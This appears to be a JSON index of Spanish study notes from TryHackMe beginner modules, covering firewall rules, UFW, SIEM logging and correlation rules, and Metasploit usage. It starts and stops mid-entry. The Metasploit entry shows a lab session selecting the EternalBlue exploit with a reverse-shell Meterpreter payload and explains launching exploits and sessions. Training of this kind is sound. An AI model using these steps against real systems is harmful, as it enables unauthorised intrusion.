responder a unas preguntas.\n\n1. Nos conectamos con `xfreerdp3`:\n   ![[Pasted image 20251024165623.png]]\n   ![[Pasted image 20251024165751.png]]\n2. Buscamos el WDF:\n   ![[Pasted image 20251024165900.png]]\n3. Vamos a inbound y miramos el puerto 22:\n   ![[Pasted image 20251024170144.png]]\n   ![[Pasted image 20251024170205.png]]\n4. Buscamos la regla que permite que una IP en concreto acceda por SSH:\n   ![[Pasted image 20251024170313.png]]\n   ![[Pasted image 20251024170338.png]]\n5. "
  },
  {
    "title": "3. Rules in Firewalls",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/3-rules-in-firewalls/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/3. Rules in Firewalls.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "Un firewall te da control sobre el tráfico de tu red. Aunque filtra el tráfico basado en reglas pre-configuradas, algunas reglas personalizadas pueden definirse para varias redes.\n\nLos componentes básicos de una regla de firewall son:\n\n- **Dirección de fuente:** Dirección IP de la que proviene el tráfico.\n- **Dirección de destinación:** Dirección IP a la que se dirije el tráfico.\n- **Puerto:** Puerto de comunicación del tráfico.\n- **Protocolo:** Protocolo usado durante la comunicación.\n- **Acción:** Lo que hará el firewall cuando detecte que se cumple esta regla.\n- **Dirección:** Define si el tráfico es entrante o saliente.\n\n-----------------------------\n<h2>Tipos de Acciones</h2>\nHay tres tipos de acciones que un firewall puede realizar:\n\n<h6>Allow (Permitir)</h6>\nIndica que el tráfico que cumple con esa regla debe ser permitido. Una regla que permita el tráfico saliente por el puerto 80 usando HTTP sería:\n\n| Action | Source         | Destination | Protocol | Port | Direction |\n| ------ | -------------- | ----------- | -------- | ---- | --------- |\n| Allow  | 192.168.1.0/24 | Any         | TCP      | 80   | Outbound  |\n\n<h6>Deny (Prohibir)</h6>\nIndica que el tráfico que cumpla con la regla no debe ser dejado pasar. Una regla que deniegue el tráfico entrante por el puerto 22 vía SSH sería:\n\n| Action | Source | Destination    | Protocol | Port | Direction |\n| ------ | ------ | -------------- | -------- | ---- | --------- |\n| Deny   | Any    | 192.168.1.0/24 | TCP      | 22   | Inbound   |\n\n<h6>Forward</h6>\nRedirige el tráfico a un segmento de red diferente usando reglas forwarding. Una regla que redirigiera el tráfico que entra por el puerto 80 hacia el servidor `192.168.1.8` sería:\n\n| Action  | Source | Destination | Protocol | Port | Direction |\n| ------- | ------ | ----------- | -------- | ---- | --------- |\n| Forward | Any    | 192.168.1.8 | TCP      | 80   | Inbound   |\n\n--------------------------------\n<h2>Direccionalidad de las Reglas</h2>\nLos firewalls tienen diferentes tipos de reglas, categorizadas en función de la direccionalidad de su tráfico.\n\n- **Inbound:** Cuando se aplican al tráfico entrante.\n- **Outbound:** Cuando se aplican al tráfico saliente.\n- **Forward:** Cuando se aplican a redirecciones dentro de la misma red."
  },
  {
    "title": "2. Types of Firewalls",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/2-types-of-firewalls/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/2. Types of Firewalls.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "Desplegar un firewall se volvió habitual en las redes después de que las organizaciones descubrieran su habilidad para filtrar tráfico dañino de sus sistemas y redes. Hay varios tipos de firewalls. Estos diferentes tipos también pueden trabajar en capas OSI diferentes. Examinemos los más comunes.\n\n![[Pasted image 20251024125154.png]]\n\n---------------------------------------\n<h2>Stateless Firewall</h2>\nEste tipo de Firewall opera en las capas 3 y 4 del modelo OSI y funciona únicamente filtrando la información basándose en reglas predeterminadas sin tener en cuenta el estado de las conexiones previas. Esto significa que disparará alertas incluso si forman parte de una conexión legítima porque no tienen en cuenta  el estado previo de conexión. Supón que el firewall deniega unos paquetes de una fuente porque no cumple con las reglas. Idealmente, debería denegar los paquetes futuros, pero olvida lo anterior. Por esto, los paquetes futuros seguirán siendo tratados y matcheados como nuevos.\n\n------------------------------\n<h2>Stateful Firewall</h2>\nEste tipo de firewall va más allá de las reglas configuradas. Lleva un recuento de las conexiones anteriores y las guarda en una tabla de estado. Esto añade otra capa de seguridad al inspeccionar los paquetes basados en su historial. Opera en capas 3 y 4 del modelo OSI. Supón que el firewall acepta unos paquetes de una fuente. En ese caso, tomará nota de esta conexión y permitirá en el futuro. Aunque no es tan simple, funcionan en base a contexto. Por lo que no sólo se fijará en conexiones antiguas.\n\n-----------------------------------\n<h2>Proxy Firewall</h2>\nEl problema de los firewalls anteriores es que ninguno tiene la habilidad de inspeccionar los contenidos de un paquete. Los firewalls proxy, intermedian la conexión entre la red privada e internet y operan en la capa 7 del modelo OSI. Inspeccionan el contenido de los paquetes. Se puede aplicar filtros por contenido.\n\n--------------------------------------\n<h2>Next-Generation Firewall (NGFW)</h2>\nEs el tipo de firewall más avanzado y opera de la capa 3 a la 7, ofreciendo inspección profunda de paquetes y otras funcionalidades que mejoran la seguridad del tráfico. Cuenta con un IPS que bloquea actividades maliciosas en tiempo real. Ofrece análisis heurísticos analizando los patrones de ataques y bloqueándolos instantáneamente antes de llegar a la red. Los NGFWs tienen capacidad de desencriptación SSL/TLS, lo que les permite inspeccionar los paquetes y correlacionarlos con las amenazas.\n\n--------------------------\n<h2>Resumen</h2>\n\n| Firewalls                 | Characteristics                                                                                                                                                                               |\n| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Stateless firewalls       | - Filtrado básico  <br>- Sin registro de conexiones pasadas  <br>- Eficiente para redes veloces                                                                                               |\n| Stateful firewalls        | - Reconoce el tráfico por patrones <br>- Reglas complejas aplicables  <br>- Monitoriza las conexiones de red                                                                                  |\n| Proxy firewalls           | - También inspecciona la información dentro de los paquetes<br>- Ofrece filtro por contenido<br>- Ofrece control de aplicación<br>- Desencripta e inspecciona paquetes de información SSL/TLS |\n| Next-generation firewalls | - Ofrece protección contra amenazas avanzada<br>- Tiene un IPS integrado<br>- Identifica anomalías en base a escaneos heurísticos<br>- Desencripta e inspecciona paquetes SSL/TLS             |\n"
  },
  {
    "title": "0. Firewall Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/0-firewall-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/0. Firewall Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "[[1. What is the Purpose of a Firewall]]\n[[2. Types of Firewalls]]\n[[3. Rules in Firewalls]]\n[[4. Windows Defender Firewall]]\n[[5. Linux iptables Firewall]]\n"
  },
  {
    "title": "5. Linux iptables Firewall",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/5-linux-iptables-firewall/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/5. Linux iptables Firewall.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "En la tarea anterior hemos visto el firewall integrado de Windows. ¿Qué pasa si eres usuario de Linux? Sigues necesitando control sobre el tráfico de tu red. Linux también ofrece un firewall integrado. Tenemos varias opciones, veamos rápidamente las más usadas.\n\n----------------------------\n<h2>Netfilter</h2>\nEs un framework dentro de Linux con funcionalidades de firewall, incluyendo filtrado de paquetes, NAT, y registro de conexiones. Sirve como base para varios firewalls disponibles en Linux. Algunos firewalls que utilizan este framework son:\n\n- **iptables:** La utilidad más comúnmente usada en las distribuciones Linux.\n- **nftables:** Es un sucesor de `iptables` que resalta el filtrado de paquetes y capabilidades NAT.\n- **firewalld:** Esta utilidad también opera en el mismo framework pero funciona diferente a los otros y viene con zonas de red pre-configuradas diferentes.\n\n------------------------\n<h2>UFW</h2>\nUncomplicated FireWall elimina las complicaciones de la fabricación de reglas dándoles una interfaz sencilla.\n\nPara comprobar el estado del firewall:\n\n```shell\nuser@ubuntu:~$ sudo ufw status\nStatus: inactive\n```\n\nPara activarlo:\n\n   ```shell\n   user@ubuntu:~$ sudo ufw enable \n   Firewall is active and enabled on system startup`\n```\n\nAquí podemos ver una regla creada. Así cambiamos la política de permisividad por defecto:\n\n```shell\nuser@ubuntu:~$ sudo ufw default allow outgoing\nDefault outgoing policy changed to 'allow'\n(be sure to update your rules accordingly)\n```\n\nPara denegar el tráfico entrante de un puerto:\n\n```shell\nuser@ubuntu:~$ sudo ufw deny 22/tcp\nRule added\nRule added (v6)\n```\n\nPara listar las reglas activas:\n\n   ```shell\n   user@ubuntu:~$ sudo ufw status numbered      \n   To                         Action      From      \n   --                         ------      ---- \n   [ 1] 22/tcp                DENY IN     Anywhere                   \n   [ 2] 22/tcp (v6)           DENY IN     Anywhere (v6)\n   ```\n\nPara borrar reglas:\n\n```shell\nuser@ubuntu:~$ sudo ufw delete 2\nDeleting:\n deny 22/tcp\nProceed with operation (y|n)? y\nRule deleted (v6)\n```\n\n"
  },
  {
    "title": "1. What is the Purpose of a Firewall",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/2-firewall-fundamentals/1-what-is-the-purpose-of-a-firewall/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/2. Firewall Fundamentals/1. What is the Purpose of a Firewall.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 2. Firewall Fundamentals",
    "content": "Hemos visto guardias de seguridad en la puerta de centros comerciales, restaurantes, ayuntamientos, etc. Estos guardias son los encargados de comprobar quién puede entrar o salir y quién no. Este guardia actúa como una pared entre el interior y exterior del recinto.\n\nMucho tráfico fluye a diario entre nuestros dispositivos digitales e Internet. ¿Qué pasa si alguien se cuela sin que lo pillen? También necesitamos un guardia de seguridad para nuestros dispositivos que pueda comprobar la información que entra y sale de ellos. Este guardia de seguridad recibe el nombre de **firewall**. Está diseñado para inspeccionar el tráfico de red entrante y saliente de un dispositivo. El objetivo es el mismo que el del guardia físico. Controlar quién o qué entra y sale. Configuras el firewall dándole reglas.\n\n--------------------------\n<h2>Objetivos de Aprendizaje</h2>\nDespués de completar esta unidad, tendremos conocimientos básicos sobre:\n\n- Los tipos de firewalls.\n- Las reglas y componentes de un firewall.\n- Práctica con el firewall integrado de Windows.\n- Práctica con el firewall integrado de Linux.\n\n------------------------\n<h2>Pre-requisitos</h2>\n[[0. Networking Concepts]]\n\n"
  },
  {
    "title": "5. Analysing Logs and Alerts",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/5-analysing-logs-and-alerts/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/5. Analysing Logs and Alerts.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "Los SIEMs recogen todos los logs relacionados con la seguridad ingeridos por los agentes, port forwarding, etc. Una vez que los logs ses han ingerido, el SIEM busca todos los comportamientos no deseados o patrones sospechosos dentro de los logs con la ayuda de condiciones configuradas por reglas. Si la condición coincide, se dispara una alerta.\n\n-------------------------\n<h2>Dashboard</h2>\nLos dashboards son el componente más importante de los SIEMs. El SIEM presenta la información después de ser normalizada e ingerida. El resumen de estos análisis se presenta en forma de vista accionable, con la ayuda de múltiples dashboards. Cada solución SIEM viene con algunos dashboards por defecto y ofrece una opción de personalizar dashboards. Alguna de la información que podemos encontrar en un dashboard es:\n\n- Alertas importantes\n- Notificaciones del sistema\n- Alerta de salud\n- Lista de los intentos fallidos de inicio de sesión\n- Contador de los eventos ingeridos\n- Reglas disparadas\n- Dominios más visitados\n\n![[Pasted image 20251024095310.png]]\n\n----------------------------\n<h2>Reglas de Correlación</h2>\nLa reglas de correlación juegan un papel importante en la detección temprana de amenazas, permitiendo a los analistas tomar medidas a tiempo. Son expresiones lógicas que pueden ser comprobadas, algunos ejemplos son:\n\n- Si un usuario obtiene 5 intentos de autentificación fallidos en 10 segundos - Eleva una alerta por `Multiple Failed Login Attempts`.\n- Si un login es exitoso después de más de 15 login attempts - Eleva una alerta por `Login After Multiple Attempts`.\n- Una regla que avise cuando se conecta un pincho, útil si está prohibido por política de compañía.\n- Si el tráfico saliente es > 25MB- Eleva una alerta por `Potential Data Exfiltration`.\n\n---------------------------\n<h2>Cómo se Crea una Regla de Correlación</h2>\nPara explicar cómo funciona la regla, consideraremos los siguientes dos escenarios:\n\n<h4>Caso de Uso 1:</h4>\nLos atacantes tienden a borrar logs después de su intrusión para eliminar el rastro. Un evento con ID único (**104**) se registra cada vez que un usuario intente borrar un log. Para crear una regla basada en esta condición podemos hacerlo como:\n\n**Rule:** Si la fuente de log es WinEventLog **AND** ID de Evento es 104 - Dispara alerta para `Event Log Cleared`\n\n<h4>Caso de Uso 2:</h4>\nLos atacantes usan comandos como whoami después de una explotación o escalada de privilegios. Los siguientes campos serían útiles de incluir en la regla.\n\n- Fuente de log\n- ID de evento\n- Nombre del nuevo proceso\n\n**Rule:** Si la fuente de log es WinEventLog **AND** EventCode es **4688** **AND** NewProcessName contiene **whoami** - Dispara una alerta para `WHOAMI command Execution DETECTED`\n\n------------------------------\n<h2>Después de la Investigación</h2>\nAl monitorizar SIEM, los analistas pasan la mayor parte de su tiempo en las dashboards. Una vez se dispara una alerta, los flujos asociados a estas se examinan. Basado en la investigación, el analista determina si es un verdadero o falso positivo. Algunas de las acciones realizadas son:\n\n- La alerta es una falsa alarma. Requiere ajustar la regla para evitar falsos positivos más adelante.\n- La alerta es un positivo real. Realiza investigación más avanzada.\n- Contactar al dueño del media para preguntar por la actividad.\n- Se confirma actividad sospechosa. Aislar al host infectado.\n- Bloquear la IP sospechosa.\n\n"
  },
  {
    "title": "4. Why SIEM",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/4-why-siem/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/4. Why SIEM.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "El SIEM se usa para ofrecer correlación entre información y amenazas detectadas. Una vez detectada la amenaza, se eleva una alerta. Esta permite a los analistas tomar acciones acordes a la investigación. El SIEM juega un rol importante en el dominio de la ciberseguridad, ayudando a protegerse contra las últimas amenazas en cuestión de poco tiempo. Proporciona buena visibilidad de lo que pasa en la infraestructura de red.\n\n------------------------\n<h2>Capabilidades SIEM</h2>\nEl SIEM es uno de los mayores componentes de los entornos SOC. El SIEM empieza recolectando logs y examinándolos si algún evento o flujo tiene una condición coincidente configurada en las reglas.\n\nAlgunas capabilidades del SIEM son:\n\n- Correlación entre eventos de diferentes fuentes.\n- Ofrecer visibilidad en las actividades host-centric y network-centric.\n- Permite a los analistas investigar las últimas amenazas.\n- Cazar amenazas que no hayan sido detectadas por las reglas.\n\n---------------------------------\n<h2>Responsabilidades de un Analista SOC</h2>\nLos analistas SOC utilizan SIEMs para tener mejor visibilidad de lo que está pasando en la red. Algunas de sus responsabilidades incluyen:\n\n- Monitorizar e investigar.\n- Identificar los falsos positivos.\n- Modificar reglas que están causando falsos positivos.\n- Reportes y legalidad vigente.\n- Identificar puntos ciegos en la red y cubrirlos.\n"
  },
  {
    "title": "3. Log Sources and Log Ingestion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/3-log-sources-and-log-ingestion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/3. Log Sources and Log Ingestion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "Cada dispositivo en la red genera algún tipo de log cuando una actividad se realiza en él. Algunos dispositivos comunes que se suelen encontrar en un entorno de red son:\n\n---------------------------\n<h2>Máquinas Windows</h2>\nWindows registra cada evento que puede ser visto mediante la utilidad Event Viewer. Asigna un ID único a cada tipo de actividad de log, haciendo fácil para el analista examinar y llevar cuenta de ellos. Para ver eventos en un entorno Windows vale con escribir `Event Viewer` en la barra de búsqueda. Estos logs de los endpoints Windows se redirigen al SIEM.\n\n![[Pasted image 20251022224503.png]]\n\n-----------------------\n<h2>Estaciones de Trabajo Linux</h2>\nLinux guarda todos los logs como eventos, errores, avisos, etc. Estos son ingeridos por el SIEM a posteriori para monitorización constante. Algunas de las rutas comunes para logs de Linux son:\n\n- **/var/log/httpd:** Contiene peticiones HTTP con respuesta y errores.\n- **/var/log/cron:** Aquellos eventos relacionados con cron se guardan aquí.\n- **/var/log/auth.log y /var/log/secure:** Guarda todos los logs referentes a la autentificación.\n- **/var/log/kern:** Este archivo guarda logs relacionados con el kernel.\n\nAquí un log de ejemplo de cron:\n```log\nMay 28 13:04:20 ebr crond[2843]: /usr/sbin/crond 4.4 dillon's cron daemon, started with loglevel notice  \nMay 28 13:04:20 ebr crond[2843]: no timestamp found (user root job sys-hourly)  \nMay 28 13:04:20 ebr crond[2843]: no timestamp found (user root job sys-daily)  \nMay 28 13:04:20 ebr crond[2843]: no timestamp found (user root job sys-weekly)  \nMay 28 13:04:20 ebr crond[2843]: no timestamp found (user root job sys-monthly)  \nJun 13 07:46:22 ebr crond[3592]: unable to exec /usr/sbin/sendmail: cron output f\n```\n\n-----------------------------\n<h2>Servidor Web</h2>\nEs importante mantener un ojo en todas las peticiones/respuestas entrando y saliendo de un servidor web, por cualquier ataque web potencial. En Linux, rutas comunes para los logs relacionados con Apache son **/var/log/apache** o **/var/log/httpd**.\n\nAquí un log de ejemplo de apache:\n\n```log\n192.168.21.200 - - [21/March/2022:10:17:10 -0300] \"GET /cgi-bin/try/ HTTP/1.0\" 200 3395\n127.0.0.1 - - [21/March/2022:10:22:04 -0300] \"GET / HTTP/1.0\" 200 2216\n```\n\n--------------------------\n<h2>Ingestión de Red</h2>\nTodos estos logs ofrecen una riqueza de información que puede ayudar a identificar problemas de seguridad. Cada SIEM tiene su propia manera de ingerir logs. Algunos métodos comunes son:\n\n1. **Agent / Forwarder:** Estas soluciones ofrecen una herramienta ligera llamada agente que se instala en cada endpoint. Está configurado para capturar todos los logs importantes y mandarlos al servidor del SIEM.\n2. **Syslog:** Es un protocolo ampliamente usado para recolectar información de varios sistemas como servidores web, bases de datos, etc, que se manda en tiempo real al destino centralizado.\n3. **Manual Upload:** Algunas soluciones SIEM, como Splunk, ELK, etc, permiten a los usuarios ingerir data offline para análisis rápido. Una vez ingerida, se normaliza y se hace disponible para el análisis.\n4. **Port-Forwarding:** Algunas soluciones SIEM pueden ser configuradas para escuchar un cierto puerto y luego los endpoints redireccionan información al SIEM en el puerto en escucha.\n\nUn ejemplo de cómo Splunk ofrece varias formas de ingestión de logs.\n\n![[Pasted image 20251022230936.png]]\n\n"
  },
  {
    "title": "0. Introduction to SIEM",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/0-introduction-to-siem/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/0. Introduction to SIEM.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/1. Introduction]]\n[[2. Network Visibility through SIEM]]\n[[3. Log Sources and Log Ingestion]]\n[[4. Why SIEM]]\n[[5. Analysing Logs and Alerts]]\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "SIEM quiere decir **Security Information and Event Management**. Es una herramienta que recolecta información de varios endpoints/dispositivos de red, los guarda en un lugar centralizado y realiza correlación entre ellos. Esta unidad cubrirá conceptos básicos requeridos para entender los SIEMs y cómo funcionan.\n\n----------------------\n<h2>Objetivos de Aprendizaje</h2>\nAlgunos son:\n\n- ¿Qué es un SIEM y cómo funciona?\n- ¿Por qué necesitamos SIEMs?\n- ¿Qué es la visibilidad de red?\n- ¿Que son las fuentes de logs y cómo se hace la ingestión de logs?\n- ¿Cuáles son las capabilities que ofrece un SIEM?"
  },
  {
    "title": "2. Network Visibility through SIEM",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/2-network-visibility-through-siem/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/2. Network Visibility through SIEM.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "Antes de explicar la importancia del SIEM, tratemos de entender por qué es crítico tener mejor visibilidad de todas las actividades en una red. La imagen debajo muestra un ejemplo de una red simple que compete varios endpoints basados en Windows/Linux, un servidor de datos y un sitio web. Cada componente se comunica con otro o accede a internet a través del router.\n\n![[Pasted image 20251022221746.png]]\n\nComo ya sabemos, cada componente de red puede tener uno o más fuentes de logs generando diferentes logs. Podemos dividir las fuentes de logs de red en dos partes lógicas:\n\n1. **Fuentes de Logs Host-Centric:**\n   Estas son fuentes de red que capturan eventos que ocurrieron en o de forma relacionada con el host. Algunas fuentes de logs de este tipo son Windows Event logs, Sysmon, Osquery, etc. Algunos ejemplos incluyen:\n\t1. Un usuario accede a un archivo.\n\t2. Un usuario intenta autenticarse.\n\t3. La actividad de ejecución de un proceso.\n\t4. Un proceso añade, edita o elimina una clave de registro o valor.\n\t5. Ejecución de Powershell.\n2. **Fuentes de Logs Network-Centric:**\n   Son logs generados cuando los hosts se comunican entre ellos o acceden a internet para visitar el sitio web. Algunos protocolos basados en red son SSH, VPN, HTTP/S, FTP, etc. Algunos ejemplos incluyen:\n\t1. Conexión SSH.\n\t2. Un archivo es accedido vía FTP.\n\t3. Tráfico Web.\n\t4. Un usuario accede a un recurso de la compañía mediante VPN.\n\t5. Compartición de archivos mediante red.\n\n---------------------------------------\n<h2>Importancia de un SIEM</h2>\nAhora que hemos cubierto varios tipos de logs es hora de entender la importancia del SIEM. Como todos estos dispositivos generan cientos de eventos por segundo, examinarlos todos en cada dispositivo puede ser una tarea casi imposible. Esa es una de las ventajas de tener un SIEM incorporado. No sólo toma los logs de varias fuentes en tiempo real sino que también ofrece la capacidad de correlacionar eventos, buscar logs, investigar incidentes y responder a ellos. Algunas funcionalidades clave que ofrece un SIEM son:\n\n- Ingestión de los en tiempo real.\n- Alertar ante actividades inusuales.\n- Monitorización y visibilidad 24/7.\n- Protección contra las últimas amenazas mediante detección temprana.\n- Estadísticas de la información y visualización.\n- Habilidad para investigar incidentes pasados."
  },
  {
    "title": "0. Metasploit - Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/0-metasploit-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/0. Metasploit - Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "[[1. Introduction to Metasploit]]\n[[2. Main Components of Metasploit]]\n[[3. Msfconsole]]\n[[4. Working with Modules]]\n"
  },
  {
    "title": "4. Working with Modules",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/4-working-with-modules/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/4. Working with Modules.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "Una vez que hayamos introducido el contexto del módulo usando el comando `use` seguido del nombre del módulo, necesitaremos configurar parámetros. Es buena práctica usar el comando `sho options` para obtener una lista de los parámetros requeridos.\n\nTodos se configuran usando la misma sintaxis: `set NOMBRE_PARÁMETRO VALOR`.\n\nAntes de continuar está bien comprobar el prompt para asegurarse de que estamos en el contexto correcto. Al usar Metasploit podemos ver 5 prompts diferentes:\n\n- **El prompt normal:** No puedes usar comandos de Metasploit aquí.\n- **El prompt msfconsole:** msf6 es el prompt, pero sin contexto, no se pueden usar comandos específicos de contexto, como configurar parámetros.\n- **El prompt de contexto:** Una vez decidido el módulo y seleccionado con `use` podemos usar comandos como `set`.\n- **El prompt de Meterpreter:** Meterpreter es un payload muy potente que veremos después. Esto quiere decir que el sistema objetivo se conectó a ti mediante una agente de Meterpreter.\n- **Una consola en el sistema objetivo:** Una vez que el exploit se ha completado, puede que ganes acceso a una así. Todos los comandos ejecutados en esta consola se ejecutan en el sistema objetivo.\n\nCon `show options` puedes ver los parámetros requeridos y con `set` configurarlos. Los parámetros que usarás normalmente son:\n\n- **RHOSTS:** Host remoto, la IP del sistema objetivo. Puedes hacerlo con notación **CIDR** (/16, /24), con rango (10.10.10.X - 10.10.10.x) o con un archivo que tomará un objetivo por linea.\n- **RPORT:** Puerto remoto, el puerto objetivo del sistema objetivo.\n- **PAYLOAD:** La carga de código que usaremos con el exploit.\n- **LHOST:** Host local, la IP de nuestro equipo.\n- **LPORT:** Puerto local, el puerto de nuestro equipo elegido para las comunicaciones.\n- **SESSION:** Cada conexión establecida con el sistema objetivo con Metasploit tendrá un ID, que usarás con los módulos de post explotación para re conectarte a una sesión existente.\n\nPuedes sobrescribir cualquier parámetro usando el comando `set` con un valor nuevo o borrarlo usando el comando `unset`. Si quieres borrarlos todos usa `unset all`.\n\nPuedes usar el comando `setg` para establecer valores que se usarán para todos los módulos. Se diferencia en eso del comando `set`.\n\nEl siguiente ejemplo usa el siguiente flujo:\n\n1. Usamos el explotable `ms17_010_eternalblue`.\n2. Configuramos `RHOSTS` usando el comando `setg`.\n3. Usamos el comando `back` para dejar el contexto.\n4. Usamos un `auxiliary` (este módulo es un escáner para para descubrir vulnerabilidades de `MS17-010`).\n5. El comando `show options` muestra que el parámetro `RHOSTS` ya tiene configurada la IP del sistema objetivo.\n\n```bash\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue \n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39\nrhosts => 10.10.165.39\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > back\nmsf6 > use auxiliary/scanner/smb/smb_ms17_010 \nmsf6 auxiliary(scanner/smb/smb_ms17_010) > show options\n\nModule options (auxiliary/scanner/smb/smb_ms17_010):\n\n   Name         Current Setting                                                Required  Description\n   ----         ---------------                                                --------  -----------\n   CHECK_ARCH   true                                                           no        Check for architecture on vulnerable hosts\n   CHECK_DOPU   true                                                           no        Check for DOUBLEPULSAR on vulnerable hosts\n   CHECK_PIPE   false                                                          no        Check for named pipe on vulnerable hosts\n   NAMED_PIPES  /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt  yes       List of named pipes to check\n   ******RHOSTS       10.10.165.39******                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'\n   RPORT        445                                                            yes       The SMB service port (TCP)\n   SMBDomain    .                                                              no        The Windows domain to use for authentication\n   SMBPass                                                                     no        The password for the specified username\n   SMBUser                                                                     no        The username to authenticate as\n   THREADS      1                                                              yes       The number of concurrent threads (max one per host)\n\nmsf6 auxiliary(scanner/smb/smb_ms17_010) >\n```\n\nLo que se configura con `setg` se mantiene hasta que sales de metasploit o hasta que usas el comando `unsetg` (o hasta que cambias su valor).\n\n------------------\n<h4>Usar módulos</h4>\nUna vez que todos los parámetros de los módulos estén configurados, podemos lanzar el módulo usando el comando `exploit`. También podemos hacerlo con el comando `run`. El comando `exploit` puede ser usado sin parámetros o usando el parámetro `-z` para lanzar el exploit y poner la sesión en segundo plano tan pronto como se abra.\n\nEsto nos devolverá al prompt del contexto desde el que hemos ejecutado el exploit. Algunos módulos soportan la opción `check`, la cual comprobará si el sistema es vulnerable sin necesidad de explotarlo.\n\n------------------------\n<h4>Sesiones</h4>\nUna vez que una vulnerabilidad ha sido explotada exitosamente, se creará una sesión. Este es el canal de comunicación entre el sistema objetivo y metasploit. Puedes usar el comando `background` para poner en segundo plano tu sesión actual. De forma alternativa `Ctrl + Z` puede se usado para el mismo propósito. \n\nEl comando `sessions` puede ser usado desde el prompt de msfconsole o cualquier contexto para ver las sesiones existentes. Para interactuar con cualquiera de las sesiones puedes usar el comando `sessions -i` seguido del ID de la sesión."
  },
  {
    "title": "1. Introduction to Metasploit",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/1-introduction-to-metasploit/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/1. Introduction to Metasploit.md",
